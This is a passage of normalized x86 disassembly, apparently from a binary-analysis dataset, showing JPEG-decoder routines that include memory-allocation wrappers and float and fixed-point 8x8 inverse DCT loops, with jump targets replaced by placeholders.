pop ebx
mov esp ebp
pop ebp
retn
sub_42af20
push ebp
mov ebp esp
sub esp 0x50
push ebx
push esi
push edi
push 0xda
mov eax [ ebp + 0x8 ]
push eax
call sub_42a490
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xe4 ]
lea eax [ edx + edx + 0x6 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42a550
add esp 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xe4 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42a4d0
add esp 0x8
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
cmp ecx [ eax + 0xe4 ]
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x12c ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42a4d0
add esp 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x130 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42a4d0
add esp 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x134 ]
shl eax 0x4
mov ecx [ ebp + 0x8 ]
add eax [ ecx + 0x138 ]
push eax
mov edx [ ebp + 0x8 ]
push edx
call sub_42a4d0
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 + 0xe8 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
mov eax [ edx ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42a4d0
add esp 0x8
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0x14 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0x18 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax + 0xd4 ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x8 ]
shl eax 0x4
add eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42a4d0
add esp 0x8
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x12c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x134 ] 0x0
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx + 0xb1 ]
test edx edx
jne r-xdata
mov [ ebp - 0x8 ] 0x0
sub_42b080
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
push 0xd9
mov eax [ ebp + 0x8 ]
push eax
call sub_42a490
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b0b0
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push 0xd8
mov eax [ ebp + 0x8 ]
push eax
call sub_42a490
add esp 0x8
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] 0x4
jge r-xdata
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax + 0xb1 ]
test ecx ecx
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + edx * 4 + 0x48 ] 0x0
je r-xdata
push 0xd9
mov edx [ ebp + 0x8 ]
push edx
call sub_42a490
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_42a9b0
add esp 0x8
cmp [ ebp - 0x4 ] 0x4
jge r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + eax * 4 + 0x58 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + ecx * 4 + 0x68 ] 0x0
je r-xdata
push 0x0
mov edx [ ebp - 0x4 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_42ad70
add esp 0xc
jmp r-xdata
push 0x1
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42ad70
add esp 0xc
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
sub_42b180
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_432e00
add esp 0x8
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx + 0xb0 ]
test edx edx
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_430430
add esp 0x4
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx + 0xb1 ]
test edx edx
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_4323e0
add esp 0x4
mov ecx [ ebp + 0x8 ]
push ecx
call sub_431680
add esp 0x4
push 0x0
mov edx [ ebp + 0x8 ]
push edx
call sub_430ed0
add esp 0x8
mov edx [ ebp + 0x8 ]
xor eax eax
mov al [ edx + 0xd4 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x1
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_42e3f0
add esp 0x4
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42f250
add esp 0x4
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xa8 ] 0x1
jg r-xdata
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx + 0xb2 ]
test edx edx
jne r-xdata
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov al [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42d1e0
add esp 0x8
push 0x0
mov edx [ ebp + 0x8 ]
push edx
call sub_42cf70
add esp 0x8
mov eax [ ebp + 0x8 ]
push eax
call sub_42a3a0
add esp 0x4
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
call [ eax + 0x18 ]
add esp 0x4
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14c ]
call [ eax ]
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b2b0
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
push eax
call [ malloc@IAT ]
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b2d0
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
push eax
call [ free@IAT ]
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b2f0
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov eax [ ebp + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b310
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x31
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b340
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b370
push ebp
mov ebp esp
sub esp 0x1c4
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x120 ]
add ecx 0x80
mov [ ebp - 0x58 ] ecx
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x48 ] edx
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x50 ]
mov [ ebp - 0x4c ] ecx
lea edx [ ebp - 0x15c ]
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x5c ] 0x8
jmp r-xdata
cmp [ ebp - 0x5c ] 0x0
jle r-xdata
lea eax [ ebp - 0x15c ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x5c ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x48 ]
movsx edx [ ecx + 0x10 ]
test edx edx
jne r-xdata
cmp [ ebp - 0x5c ] 0x8
jge r-xdata
mov ecx [ ebp - 0x48 ]
movsx edx [ ecx ]
mov [ ebp - 0x168 ] edx
fild [ ebp - 0x168 ]
mov eax [ ebp - 0x4c ]
fmul [ eax ]
fstp [ ebp - 0x4 ]
mov ecx [ ebp - 0x48 ]
movsx edx [ ecx + 0x20 ]
mov [ ebp - 0x16c ] edx
fild [ ebp - 0x16c ]
mov eax [ ebp - 0x4c ]
fmul [ eax + 0x40 ]
fstp [ ebp - 0x8 ]
mov ecx [ ebp - 0x48 ]
movsx edx [ ecx + 0x40 ]
mov [ ebp - 0x170 ] edx
fild [ ebp - 0x170 ]
mov eax [ ebp - 0x4c ]
fmul [ eax + 0x80 ]
fstp [ ebp - 0xc ]
mov ecx [ ebp - 0x48 ]
movsx edx [ ecx + 0x60 ]
mov [ ebp - 0x174 ] edx
fild [ ebp - 0x174 ]
mov eax [ ebp - 0x4c ]
fmul [ eax + 0xc0 ]
fstp [ ebp - 0x10 ]
fld [ ebp - 0x4 ]
fadd [ ebp - 0xc ]
fstp [ ebp - 0x24 ]
fld [ ebp - 0x4 ]
fsub [ ebp - 0xc ]
fstp [ ebp - 0x28 ]
fld [ ebp - 0x8 ]
fadd [ ebp - 0x10 ]
fstp [ ebp - 0x30 ]
fld [ ebp - 0x8 ]
fsub [ ebp - 0x10 ]
fmul [ r--data ]
fsub [ ebp - 0x30 ]
fstp [ ebp - 0x2c ]
fld [ ebp - 0x24 ]
fadd [ ebp - 0x30 ]
fstp [ ebp - 0x4 ]
fld [ ebp - 0x24 ]
fsub [ ebp - 0x30 ]
fstp [ ebp - 0x10 ]
fld [ ebp - 0x28 ]
fadd [ ebp - 0x2c ]
fstp [ ebp - 0x8 ]
fld [ ebp - 0x28 ]
fsub [ ebp - 0x2c ]
fstp [ ebp - 0xc ]
mov ecx [ ebp - 0x48 ]
movsx edx [ ecx + 0x10 ]
mov [ ebp - 0x178 ] edx
fild [ ebp - 0x178 ]
mov eax [ ebp - 0x4c ]
fmul [ eax + 0x20 ]
fstp [ ebp - 0x14 ]
mov ecx [ ebp - 0x48 ]
movsx edx [ ecx + 0x30 ]
mov [ ebp - 0x17c ] edx
fild [ ebp - 0x17c ]
mov eax [ ebp - 0x4c ]
fmul [ eax + 0x60 ]
fstp [ ebp - 0x18 ]
mov ecx [ ebp - 0x48 ]
movsx edx [ ecx + 0x50 ]
mov [ ebp - 0x180 ] edx
fild [ ebp - 0x180 ]
mov eax [ ebp - 0x4c ]
fmul [ eax + 0xa0 ]
fstp [ ebp - 0x1c ]
mov ecx [ ebp - 0x48 ]
movsx edx [ ecx + 0x70 ]
mov [ ebp - 0x184 ] edx
fild [ ebp - 0x184 ]
mov eax [ ebp - 0x4c ]
fmul [ eax + 0xe0 ]
fstp [ ebp - 0x20 ]
fld [ ebp - 0x1c ]
fadd [ ebp - 0x18 ]
fstp [ ebp - 0x44 ]
fld [ ebp - 0x1c ]
fsub [ ebp - 0x18 ]
fstp [ ebp - 0x38 ]
fld [ ebp - 0x14 ]
fadd [ ebp - 0x20 ]
fstp [ ebp - 0x3c ]
fld [ ebp - 0x14 ]
fsub [ ebp - 0x20 ]
fstp [ ebp - 0x40 ]
fld [ ebp - 0x3c ]
fadd [ ebp - 0x44 ]
fstp [ ebp - 0x20 ]
fld [ ebp - 0x3c ]
fsub [ ebp - 0x44 ]
fmul [ r--data ]
fstp [ ebp - 0x28 ]
fld [ ebp - 0x38 ]
fadd [ ebp - 0x40 ]
fmul [ r--data ]
fstp [ ebp - 0x34 ]
fld [ r--data ]
fmul [ ebp - 0x40 ]
fsub [ ebp - 0x34 ]
fstp [ ebp - 0x24 ]
fld [ r--data ]
fmul [ ebp - 0x38 ]
fadd [ ebp - 0x34 ]
fst [ ebp - 0x2c ]
fsub [ ebp - 0x20 ]
fstp [ ebp - 0x1c ]
fld [ ebp - 0x28 ]
fsub [ ebp - 0x1c ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x24 ]
fadd [ ebp - 0x18 ]
fstp [ ebp - 0x14 ]
fld [ ebp - 0x4 ]
fadd [ ebp - 0x20 ]
mov ecx [ ebp - 0x50 ]
fstp [ ecx ]
fld [ ebp - 0x4 ]
fsub [ ebp - 0x20 ]
mov edx [ ebp - 0x50 ]
fstp [ edx + 0xe0 ]
fld [ ebp - 0x8 ]
fadd [ ebp - 0x1c ]
mov eax [ ebp - 0x50 ]
fstp [ eax + 0x20 ]
fld [ ebp - 0x8 ]
fsub [ ebp - 0x1c ]
mov ecx [ ebp - 0x50 ]
fstp [ ecx + 0xc0 ]
fld [ ebp - 0xc ]
fadd [ ebp - 0x18 ]
mov edx [ ebp - 0x50 ]
fstp [ edx + 0x40 ]
fld [ ebp - 0xc ]
fsub [ ebp - 0x18 ]
mov eax [ ebp - 0x50 ]
fstp [ eax + 0xa0 ]
fld [ ebp - 0x10 ]
fadd [ ebp - 0x14 ]
mov ecx [ ebp - 0x50 ]
fstp [ ecx + 0x80 ]
fld [ ebp - 0x10 ]
fsub [ ebp - 0x14 ]
mov edx [ ebp - 0x50 ]
fstp [ edx + 0x60 ]
mov eax [ ebp - 0x48 ]
add eax 0x2
mov [ ebp - 0x48 ] eax
mov ecx [ ebp - 0x4c ]
add ecx 0x4
mov [ ebp - 0x4c ] ecx
mov edx [ ebp - 0x50 ]
add edx 0x4
mov [ ebp - 0x50 ] edx
jmp r-xdata
mov eax [ ebp - 0x48 ]
movsx ecx [ eax + 0x20 ]
test ecx ecx
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x5c ]
mov eax [ ebp + 0x14 ]
mov ecx [ eax + edx * 4 ]
add ecx [ ebp + 0x18 ]
mov [ ebp - 0x54 ] ecx
mov edx [ ebp - 0x50 ]
mov eax [ ebp - 0x50 ]
fld [ edx ]
fadd [ eax + 0x10 ]
fstp [ ebp - 0x24 ]
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x50 ]
fld [ ecx ]
fsub [ edx + 0x10 ]
fstp [ ebp - 0x28 ]
mov eax [ ebp - 0x50 ]
mov ecx [ ebp - 0x50 ]
fld [ eax + 0x8 ]
fadd [ ecx + 0x18 ]
fstp [ ebp - 0x30 ]
mov edx [ ebp - 0x50 ]
mov eax [ ebp - 0x50 ]
fld [ edx + 0x8 ]
fsub [ eax + 0x18 ]
fmul [ r--data ]
fsub [ ebp - 0x30 ]
fstp [ ebp - 0x2c ]
fld [ ebp - 0x24 ]
fadd [ ebp - 0x30 ]
fstp [ ebp - 0x4 ]
fld [ ebp - 0x24 ]
fsub [ ebp - 0x30 ]
fstp [ ebp - 0x10 ]
fld [ ebp - 0x28 ]
fadd [ ebp - 0x2c ]
fstp [ ebp - 0x8 ]
fld [ ebp - 0x28 ]
fsub [ ebp - 0x2c ]
fstp [ ebp - 0xc ]
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x50 ]
fld [ ecx + 0x14 ]
fadd [ edx + 0xc ]
fstp [ ebp - 0x44 ]
mov eax [ ebp - 0x50 ]
mov ecx [ ebp - 0x50 ]
fld [ eax + 0x14 ]
fsub [ ecx + 0xc ]
fstp [ ebp - 0x38 ]
mov edx [ ebp - 0x50 ]
mov eax [ ebp - 0x50 ]
fld [ edx + 0x4 ]
fadd [ eax + 0x1c ]
fstp [ ebp - 0x3c ]
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x50 ]
fld [ ecx + 0x4 ]
fsub [ edx + 0x1c ]
fstp [ ebp - 0x40 ]
fld [ ebp - 0x3c ]
fadd [ ebp - 0x44 ]
fstp [ ebp - 0x20 ]
fld [ ebp - 0x3c ]
fsub [ ebp - 0x44 ]
fmul [ r--data ]
fstp [ ebp - 0x28 ]
fld [ ebp - 0x38 ]
fadd [ ebp - 0x40 ]
fmul [ r--data ]
fstp [ ebp - 0x34 ]
fld [ r--data ]
fmul [ ebp - 0x40 ]
fsub [ ebp - 0x34 ]
fstp [ ebp - 0x24 ]
fld [ r--data ]
fmul [ ebp - 0x38 ]
fadd [ ebp - 0x34 ]
fst [ ebp - 0x2c ]
fsub [ ebp - 0x20 ]
fstp [ ebp - 0x1c ]
fld [ ebp - 0x28 ]
fsub [ ebp - 0x1c ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x24 ]
fadd [ ebp - 0x18 ]
fstp [ ebp - 0x14 ]
fld [ ebp - 0x4 ]
fadd [ ebp - 0x20 ]
call _ftol
add eax 0x4
sar eax 0x3
and eax 0x3ff
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x58 ]
mov al [ edx + eax ]
mov [ ecx ] al
fld [ ebp - 0x4 ]
fsub [ ebp - 0x20 ]
call _ftol
add eax 0x4
sar eax 0x3
and eax 0x3ff
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x58 ]
mov al [ edx + eax ]
mov [ ecx + 0x7 ] al
fld [ ebp - 0x8 ]
fadd [ ebp - 0x1c ]
call _ftol
add eax 0x4
sar eax 0x3
and eax 0x3ff
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x58 ]
mov al [ edx + eax ]
mov [ ecx + 0x1 ] al
fld [ ebp - 0x8 ]
fsub [ ebp - 0x1c ]
call _ftol
add eax 0x4
sar eax 0x3
and eax 0x3ff
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x58 ]
mov al [ edx + eax ]
mov [ ecx + 0x6 ] al
fld [ ebp - 0xc ]
fadd [ ebp - 0x18 ]
call _ftol
add eax 0x4
sar eax 0x3
and eax 0x3ff
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x58 ]
mov al [ edx + eax ]
mov [ ecx + 0x2 ] al
fld [ ebp - 0xc ]
fsub [ ebp - 0x18 ]
call _ftol
add eax 0x4
sar eax 0x3
and eax 0x3ff
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x58 ]
mov al [ edx + eax ]
mov [ ecx + 0x5 ] al
fld [ ebp - 0x10 ]
fadd [ ebp - 0x14 ]
call _ftol
add eax 0x4
sar eax 0x3
and eax 0x3ff
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x58 ]
mov al [ edx + eax ]
mov [ ecx + 0x4 ] al
fld [ ebp - 0x10 ]
fsub [ ebp - 0x14 ]
call _ftol
add eax 0x4
sar eax 0x3
and eax 0x3ff
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x58 ]
mov al [ edx + eax ]
mov [ ecx + 0x3 ] al
mov ecx [ ebp - 0x50 ]
add ecx 0x20
mov [ ebp - 0x50 ] ecx
jmp r-xdata
mov eax [ ebp - 0x5c ]
sub eax 0x1
mov [ ebp - 0x5c ] eax
mov edx [ ebp - 0x48 ]
movsx eax [ edx + 0x30 ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x5c ]
add ecx 0x1
mov [ ebp - 0x5c ] ecx
mov ecx [ ebp - 0x48 ]
movsx edx [ ecx + 0x40 ]
test edx edx
jne r-xdata
mov eax [ ebp - 0x48 ]
movsx ecx [ eax + 0x50 ]
test ecx ecx
jne r-xdata
mov edx [ ebp - 0x48 ]
movsx eax [ edx + 0x60 ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x48 ]
movsx edx [ ecx + 0x70 ]
test edx edx
jne r-xdata
mov eax [ ebp - 0x48 ]
movsx ecx [ eax ]
mov [ ebp - 0x164 ] ecx
fild [ ebp - 0x164 ]
mov edx [ ebp - 0x4c ]
fmul [ edx ]
fstp [ ebp - 0x160 ]
mov eax [ ebp - 0x50 ]
mov ecx [ ebp - 0x160 ]
mov [ eax ] ecx
mov edx [ ebp - 0x50 ]
mov eax [ ebp - 0x160 ]
mov [ edx + 0x20 ] eax
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x160 ]
mov [ ecx + 0x40 ] edx
mov eax [ ebp - 0x50 ]
mov ecx [ ebp - 0x160 ]
mov [ eax + 0x60 ] ecx
mov edx [ ebp - 0x50 ]
mov eax [ ebp - 0x160 ]
mov [ edx + 0x80 ] eax
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x160 ]
mov [ ecx + 0xa0 ] edx
mov eax [ ebp - 0x50 ]
mov ecx [ ebp - 0x160 ]
mov [ eax + 0xc0 ] ecx
mov edx [ ebp - 0x50 ]
mov eax [ ebp - 0x160 ]
mov [ edx + 0xe0 ] eax
mov ecx [ ebp - 0x48 ]
add ecx 0x2
mov [ ebp - 0x48 ] ecx
mov edx [ ebp - 0x4c ]
add edx 0x4
mov [ ebp - 0x4c ] edx
mov eax [ ebp - 0x50 ]
add eax 0x4
mov [ ebp - 0x50 ] eax
jmp r-xdata
sub_42b980
push ebp
mov ebp esp
sub esp 0x1a4
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x120 ]
add ecx 0x80
mov [ ebp - 0x58 ] ecx
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x48 ] edx
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x50 ]
mov [ ebp - 0x4c ] ecx
lea edx [ ebp - 0x15c ]
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x5c ] 0x8
jmp r-xdata
cmp [ ebp - 0x5c ] 0x0
jle r-xdata
lea ecx [ ebp - 0x15c ]
mov [ ebp - 0x50 ] ecx
mov [ ebp - 0x5c ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x48 ]
movsx edx [ ecx + 0x10 ]
test edx edx
jne r-xdata
cmp [ ebp - 0x5c ] 0x8
jge r-xdata
mov ecx [ ebp - 0x48 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x4c ]
imul edx [ eax ]
mov [ ebp - 0x4 ] edx
mov ecx [ ebp - 0x48 ]
movsx edx [ ecx + 0x20 ]
mov eax [ ebp - 0x4c ]
imul edx [ eax + 0x40 ]
mov [ ebp - 0x8 ] edx
mov ecx [ ebp - 0x48 ]
movsx edx [ ecx + 0x40 ]
mov eax [ ebp - 0x4c ]
imul edx [ eax + 0x80 ]
mov [ ebp - 0xc ] edx
mov ecx [ ebp - 0x48 ]
movsx edx [ ecx + 0x60 ]
mov eax [ ebp - 0x4c ]
imul edx [ eax + 0xc0 ]
mov [ ebp - 0x10 ] edx
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0xc ]
mov [ ebp - 0x24 ] ecx
mov edx [ ebp - 0x4 ]
sub edx [ ebp - 0xc ]
mov [ ebp - 0x28 ] edx
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0x10 ]
imul ecx ecx 0x16a
sar ecx 0x8
sub ecx [ ebp - 0x30 ]
mov [ ebp - 0x2c ] ecx
mov edx [ ebp - 0x24 ]
add edx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x30 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x28 ]
add ecx [ ebp - 0x2c ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x28 ]
sub edx [ ebp - 0x2c ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x48 ]
movsx ecx [ eax + 0x10 ]
mov edx [ ebp - 0x4c ]
imul ecx [ edx + 0x20 ]
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0x48 ]
movsx ecx [ eax + 0x30 ]
mov edx [ ebp - 0x4c ]
imul ecx [ edx + 0x60 ]
mov [ ebp - 0x18 ] ecx
mov eax [ ebp - 0x48 ]
movsx ecx [ eax + 0x50 ]
mov edx [ ebp - 0x4c ]
imul ecx [ edx + 0xa0 ]
mov [ ebp - 0x1c ] ecx
mov eax [ ebp - 0x48 ]
movsx ecx [ eax + 0x70 ]
mov edx [ ebp - 0x4c ]
imul ecx [ edx + 0xe0 ]
mov [ ebp - 0x20 ] ecx
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x18 ]
mov [ ebp - 0x44 ] eax
mov ecx [ ebp - 0x1c ]
sub ecx [ ebp - 0x18 ]
mov [ ebp - 0x38 ] ecx
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x20 ]
mov [ ebp - 0x3c ] edx
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x20 ]
mov [ ebp - 0x40 ] eax
mov ecx [ ebp - 0x3c ]
add ecx [ ebp - 0x44 ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x3c ]
sub edx [ ebp - 0x44 ]
imul edx edx 0x16a
sar edx 0x8
mov [ ebp - 0x28 ] edx
mov eax [ ebp - 0x38 ]
add eax [ ebp - 0x40 ]
imul eax eax 0x1d9
sar eax 0x8
mov [ ebp - 0x34 ] eax
mov ecx [ ebp - 0x40 ]
imul ecx ecx 0x115
sar ecx 0x8
sub ecx [ ebp - 0x34 ]
mov [ ebp - 0x24 ] ecx
mov edx [ ebp - 0x38 ]
imul edx edx 0xfffffd63
sar edx 0x8
add edx [ ebp - 0x34 ]
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x2c ]
sub eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0x28 ]
sub ecx [ ebp - 0x1c ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x24 ]
add edx [ ebp - 0x18 ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x50 ]
mov [ ecx ] eax
mov edx [ ebp - 0x4 ]
sub edx [ ebp - 0x20 ]
mov eax [ ebp - 0x50 ]
mov [ eax + 0xe0 ] edx
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x50 ]
mov [ edx + 0x20 ] ecx
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x50 ]
mov [ ecx + 0xc0 ] eax
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x18 ]
mov eax [ ebp - 0x50 ]
mov [ eax + 0x40 ] edx
mov ecx [ ebp - 0xc ]
sub ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x50 ]
mov [ edx + 0xa0 ] ecx
mov eax [ ebp - 0x10 ]
add eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x50 ]
mov [ ecx + 0x80 ] eax
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x14 ]
mov eax [ ebp - 0x50 ]
mov [ eax + 0x60 ] edx
mov ecx [ ebp - 0x48 ]
add ecx 0x2
mov [ ebp - 0x48 ] ecx
mov edx [ ebp - 0x4c ]
add edx 0x4
mov [ ebp - 0x4c ] edx
mov eax [ ebp - 0x50 ]
add eax 0x4
mov [ ebp - 0x50 ] eax
jmp r-xdata
mov eax [ ebp - 0x48 ]
movsx ecx [ eax + 0x20 ]
test ecx ecx
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x5c ]
mov ecx [ ebp + 0x14 ]
mov edx [ ecx + eax * 4 ]
add edx [ ebp + 0x18 ]
mov [ ebp - 0x54 ] edx
mov eax [ ebp - 0x50 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x5c ]
sub eax 0x1
mov [ ebp - 0x5c ] eax
mov edx [ ebp - 0x48 ]
movsx eax [ edx + 0x30 ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x50 ]
mov edx [ ecx ]
mov eax [ ebp - 0x50 ]
add edx [ eax + 0x10 ]
mov [ ebp - 0x24 ] edx
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x50 ]
mov eax [ ecx ]
sub eax [ edx + 0x10 ]
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x50 ]
mov edx [ ecx + 0x8 ]
mov eax [ ebp - 0x50 ]
add edx [ eax + 0x18 ]
mov [ ebp - 0x30 ] edx
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x50 ]
mov eax [ ecx + 0x8 ]
sub eax [ edx + 0x18 ]
imul eax eax 0x16a
sar eax 0x8
sub eax [ ebp - 0x30 ]
mov [ ebp - 0x2c ] eax
mov ecx [ ebp - 0x24 ]
add ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x30 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x2c ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x28 ]
sub ecx [ ebp - 0x2c ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x50 ]
mov eax [ edx + 0x14 ]
mov ecx [ ebp - 0x50 ]
add eax [ ecx + 0xc ]
